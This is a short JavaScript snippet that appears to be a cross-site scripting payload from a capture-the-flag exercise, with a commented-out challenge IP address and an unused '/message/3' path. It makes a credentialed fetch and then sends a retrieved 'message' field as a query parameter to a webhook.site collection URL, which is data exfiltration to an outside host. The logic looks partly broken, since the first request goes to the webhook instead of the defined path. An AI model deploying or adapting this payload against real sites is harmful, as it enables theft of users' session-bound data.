// const url = 'https://134.122.109.198:31655/message/4'
const url = '/message/3'
fetch("http://webhook.site/a51a8490-eb47-4f69-bba1-a8d094c53c41", {
        method: 'GET',
        credentials: "include",
}).then((response) => response.json())
.then((data) => {
        fetch('http://webhook.site/a51a8490-eb47-4f69-bba1-a8d094c53c41?message=' + data.message)
});
